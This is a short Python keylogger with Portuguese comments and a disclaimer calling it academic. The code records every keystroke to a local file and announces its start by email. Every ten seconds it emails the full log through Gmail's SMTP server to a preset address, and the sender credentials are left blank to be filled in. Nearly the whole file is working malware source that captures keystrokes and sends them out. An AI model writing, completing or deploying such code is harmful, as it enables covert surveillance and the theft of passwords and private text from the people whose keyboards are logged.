#atenção, esse código foi criado e compartilhado com intenções acadêmicas
#não é encorajado usar o código a seguir para roubo de informações.

import time
import keyboard
import smtplib
from email.message import EmailMessage

# Captura teclas e salva no arquivo
def capturar_teclas():
    evento = keyboard.read_event(suppress=False) 
    if evento.event_type == keyboard.KEY_DOWN:
        tecla = evento.name
        if tecla is None:
            return 
        if tecla == "space":
            tecla = " "
        elif tecla == "enter":
            tecla = "\n"
        elif tecla.isdigit(): 
                tecla = tecla
        elif len(tecla) > 1:
            tecla = f"<{tecla}>"
        with open('registro.txt', 'a', encoding='utf-8') as arquivo:
            arquivo.write(tecla)

# Envia um e-mail simples ao iniciar o programa
def enviar_email_check():
    msg = EmailMessage()
    msg.set_content("Conexão iniciada")
    msg['Subject'] = 'Status'
    msg['From'] = remetente
    msg['To'] = destinatarios[0]

    with smtplib.SMTP('smtp.gmail.com', 587) as servidor:
        servidor.starttls()
        servidor.login(remetente, senha)
        servidor.send_message(msg)

# Envia o conteúdo do arquivo registro.txt
def enviar_email():
    with open('registro.txt', 'r', encoding='utf-8') as arquivo:
        conteudo = arquivo.read()

    msg = EmailMessage()
    msg.set_content(conteudo)
    msg['Subject'] = 'Registro de Teclas'
    msg['From'] = remetente
    msg['To'] = destinatarios[0]

    with smtplib.SMTP('smtp.gmail.com', 587) as servidor:
        servidor.starttls()
        servidor.login(remetente, senha)
        servidor.send_message(msg)

# Configurações de e-mail
remetente = ''
senha = '' 
destinatarios = ['']

# Loop principal
ultimo_envio = time.time()
enviar_email_check()

while True:
    capturar_teclas()
    if time.time() - ultimo_envio > 10:
        enviar_email()
        ultimo_envio = time.time()   